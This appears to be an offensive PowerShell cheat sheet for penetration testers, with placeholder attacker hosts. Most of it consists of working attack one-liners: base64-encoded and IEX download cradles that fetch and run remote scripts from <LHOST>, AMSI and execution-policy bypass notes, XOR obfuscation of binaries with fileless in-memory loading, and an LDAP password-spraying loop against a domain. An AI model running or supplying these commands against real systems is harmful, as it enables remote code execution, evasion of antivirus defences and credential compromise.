% powershell/misc

# base64 encode command string
$text = "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/run.txt') | IEX"
$b64 = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
powershell -enc $b64

# fileless import/execute (bypass amsi first)
IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/<PS1>")
powershell -ep bypass -command "iex(New-Object Net.WebClient).DownloadString('http://<LHOST>/<PS1>')"
echo IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<PS1>') | powershell -NoProfile -Command -
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/<PS1>') | IEX
powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest 'http://<LHOST>/<PS1>').Content).Invoke();"

# fileless download
$content = iwr http://<LHOST>/win/<FILENAME> -UseBasicParsing
$content = iwr http://<LHOST>:8000/<FILENAME> -UseBasicParsing
$text_only_no_bytes = (New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/run.txt')

# download file
(New-Object System.Net.WebClient).DownloadFile("http://<LHOST>:8000/<FILENAME>", "C:<BS>Windows<BS>Tasks<BS><FILENAME>")
iwr http://<LHOST>:8000/<FILENAME> -o C:/Windows/Tasks/<FILENAME>

# detect password reuse for different accounts (test needed)
$password = "Aa111111"; 
cat .\users.txt | % { $q = New-Object System.DirectoryServices.DirectoryEntry("LDAP://SEVENKINGDOMS.LOCAL","$_","$password"); if ($q.name -ne $null){Write-Host -ForegroundColor Green "[*] GOTCHA! User:$_ Password:$password"} }

# xor encrypt binary (run on kali with sudo)
$byteArray = [IO.File]::ReadAllBytes("<PATH>/<CSHARP_BIN>.exe"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [IO.File]::WriteAllBytes("$pwd/<CSHARP>.exe.xored", $byteArray)

# xor decrypt binary into memory (local xor file)
$byteArray = [IO.File]::ReadAllBytes("$pwd\\<CSHARP_BIN>.exe.xored"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [Reflection.Assembly]::Load([byte[]]$byteArray); [<NAMESPACE>.<CLASSNAME>]::Main("<ARGUMENTS>".split(' '));

# xor decrypt binary into memory (fileless)
$byteArray = (New-Object System.Net.WebClient).DownloadData("http://<LHOST>/win/<CSHARP_BIN>.exe.xored"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [Reflection.Assembly]::Load([byte[]]$byteArray); [<NAMESPACE>.<CLASSNAME>]::Main("<ARGUMENTS>".split(' '));

$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
$ BS: echo '\'

# remoting
Enter-PSSession -ComputerName <REMOTE_COMPUTER_NAME> -Credential <USERNAME>

# remoting JEA
Enter-PSSession -ComputerName <REMOTE_COMPUTER_NAME> -ConfigurationName <CONFIG_NAME>

# view history
type $((Get-PSReadlineOption).HistorySavePath)

# unzip extract
Expand-Archive -Path <SRC_PATH> -DestinationPath <DST_PATH>
